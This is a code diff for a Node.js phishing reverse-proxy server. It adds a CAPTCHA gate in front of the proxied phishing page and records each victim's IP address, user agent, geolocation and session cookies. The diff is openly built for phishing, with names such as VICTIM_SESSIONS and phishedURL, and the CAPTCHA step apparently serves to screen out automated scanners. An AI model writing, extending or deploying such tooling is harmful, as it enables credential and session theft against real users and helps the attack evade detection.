@@ -139,42 +139,71 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 //     console.log('[INCOMING COOKIE] (none)');
 // }
 
-    if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
-        try {
-            const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
-            let session = currentSession;
-
-            if (!currentSession) {
-                const { cookieName, cookieValue } = generateNewSession(phishedURL);
-                const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`;
-                clientResponse.setHeader("Set-Cookie", cookieHeader);
-             //   console.log(`[SET SESSION COOKIE] ${cookieHeader}`);
-                session = cookieName;
-            }
-            VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
-            VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
-            VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
-            VICTIM_SESSIONS[session].port = phishedURL.port;
-            VICTIM_SESSIONS[session].host = phishedURL.host;
-            VICTIM_SESSIONS[session].ip = getClientIP(clientRequest);
-            VICTIM_SESSIONS[session].userAgent = headers['user-agent'] || 'Unknown';
-
-getVictimGeo(VICTIM_SESSIONS[session].ip).then(geo => {
-    if (geo) VICTIM_SESSIONS[session].geo = geo;
-}).catch(() => {}); 
-            if (!VICTIM_SESSIONS[session].proxyLevels) {
-                VICTIM_SESSIONS[session].proxyLevels = [{ url: '', level: 'direct' }];
-            }
-
-            clientResponse.writeHead(200, { "Content-Type": "text/html" });
-            fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
-        }
-        catch (error) {
-            displayError("Phishing URL parsing failed", error, url);
-            clientResponse.writeHead(404, { "Content-Type": "text/html" });
-            fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
-        }
+   // ---- CAPTCHA SUCCESS ROUTE ----
+if (url === '/captcha-success') {
+    const session = getUserSession(headers.cookie);
+    if (session && VICTIM_SESSIONS[session]) {
+        VICTIM_SESSIONS[session].captchaPassed = true;
+        console.log(`[CAPTCHA] Session ${session} verified via /captcha-success`);
+        const redirect = VICTIM_SESSIONS[session].originalUrl || PROXY_ENTRY_POINT;
+        // Ensure the redirect includes the full query string (it's already stored)
+        clientResponse.writeHead(302, { Location: redirect });
+        clientResponse.end();
+        return;
     }
+    clientResponse.writeHead(401, { 'Content-Type': 'text/plain' });
+    clientResponse.end('Unauthorized');
+    return;
+}
+    
+    if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
+    try {
+        const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
+        let session = currentSession;
+
+        if (!currentSession) {
+            const { cookieName, cookieValue } = generateNewSession(phishedURL);
+            const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`;
+            clientResponse.setHeader("Set-Cookie", cookieHeader);
+            session = cookieName;
+            // Store the original request URL for later redirect
+            VICTIM_SESSIONS[session].originalUrl = url;
+        }
+
+        // ---- CAPTCHA CHECK ----
+        if (!VICTIM_SESSIONS[session].captchaPassed) {
+            console.log(`[CAPTCHA] Serving CAPTCHA for session ${session}`);
+            serveCaptchaPage(clientResponse, session, headers.host);
+            return;
+        }
+
+        // ---- Proceed with normal proxying ----
+        VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
+        VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
+        VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
+        VICTIM_SESSIONS[session].port = phishedURL.port;
+        VICTIM_SESSIONS[session].host = phishedURL.host;
+        VICTIM_SESSIONS[session].ip = getClientIP(clientRequest);
+        VICTIM_SESSIONS[session].userAgent = headers['user-agent'] || 'Unknown';
+
+        getVictimGeo(VICTIM_SESSIONS[session].ip).then(geo => {
+            if (geo) VICTIM_SESSIONS[session].geo = geo;
+        }).catch(() => {});
+
+        if (!VICTIM_SESSIONS[session].proxyLevels) {
+            VICTIM_SESSIONS[session].proxyLevels = [{ url: '', level: 'direct' }];
+        }
+
+        clientResponse.writeHead(200, { "Content-Type": "text/html" });
+        fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
+    }
+    catch (error) {
+        displayError("Phishing URL parsing failed", error, url);
+        clientResponse.writeHead(404, { "Content-Type": "text/html" });
+        fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
+    }
+    return; // ensure we don't fall through
+}
 
     else if (currentSession || url === PROXY_PATHNAMES.proxy) {
         if (url === PROXY_PATHNAMES.serviceWorker) {
@@ -689,12 +718,22 @@ function generateNewSession(phishedURL) {
     VICTIM_SESSIONS[cookieName].cookies = [];
     VICTIM_SESSIONS[cookieName].logFilename = `${phishedURL.host}__${new Date().toISOString()}`;
     VICTIM_SESSIONS[cookieName].alerted = false;
+    VICTIM_SESSIONS[cookieName].captchaPassed = false;
+    VICTIM_SESSIONS[cookieName]. originalUrl = null;
     createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);
 
     return {
         cookieName: cookieName,
         cookieValue: cookieValue
     };
+}
+
+function serveCaptchaPage(res, sessionId, hostname) {
+    const captchaHtml = fs.readFileSync(path.join(__dirname, 'captcha.html'), 'utf8');
+    // Replace the victimId placeholder with the session ID
+    const rendered = captchaHtml.replace(/<%= victimId %>/g, sessionId);
+    res.writeHead(200, { 'Content-Type': 'text/html' });
+    res.end(rendered);
 }
 
 async function encryptData(data) {
